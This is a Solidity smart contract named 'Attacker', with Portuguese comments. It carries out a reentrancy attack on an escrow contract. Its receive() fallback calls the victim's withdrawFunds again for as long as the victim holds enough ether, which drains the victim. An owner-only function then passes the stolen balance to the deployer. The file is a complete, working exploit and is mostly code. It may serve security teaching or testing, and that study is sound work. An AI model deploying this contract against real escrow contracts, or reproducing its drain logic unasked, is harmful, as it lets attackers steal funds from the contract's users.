// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2 <0.9.0;
import {Escrow } from "./2021EscrowInterface.sol";

contract Attacker {

    event Exploited(address target, uint balance);

    address owner; // Makes contract ownable.
    
    Escrow escrow;
    uint deposit;
    bytes32 escrowID;//Id criado quando  se realizan um deposito no contrato da vitima

    constructor () public {//para fixar um proprietario ao implantar o contrato
       owner = msg.sender;
    }

    function attack(bytes32 _escrowID, address _victim, uint _deposit) external {
        escrow = Escrow(_victim);
        escrowID = _escrowID;
        deposit = _deposit;
        escrow.withdrawFunds(escrowID);
    }

    function transferBalance() external {
        require (msg.sender == owner, "only owner function");//só para o proprietario poder retirare os fundos do contrato
        address payable _owner = payable(msg.sender);
        _owner.transfer(address(this).balance);
    }

    receive() external payable {//função nativa para gerencia o recebimento
        if (address(escrow).balance >= deposit) {
            escrow.withdrawFunds(escrowID);
        }
        emit Exploited(address(escrow), address(escrow).balance); 
    }
    function getBalance() public view returns (uint){
        return address(this).balance;
    }
}